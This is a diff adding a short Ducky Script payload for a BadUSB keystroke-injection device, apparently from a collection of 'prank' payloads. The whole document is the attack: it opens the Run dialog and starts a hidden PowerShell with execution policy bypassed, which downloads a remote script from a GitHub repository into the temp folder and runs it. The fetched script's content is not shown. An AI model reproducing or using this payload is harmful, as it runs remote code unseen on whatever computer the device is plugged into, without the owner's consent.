@@ -1,0 +1,6 @@
+DELAY 250
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/pilot2254/badusb/main/payloads/pranks/speak-text/main.ps1' -OutFile '$env:temp\speak-text.ps1'; powershell -ExecutionPolicy Bypass -File '$env:temp\speak-text.ps1'"
+DELAY 100
+ENTER
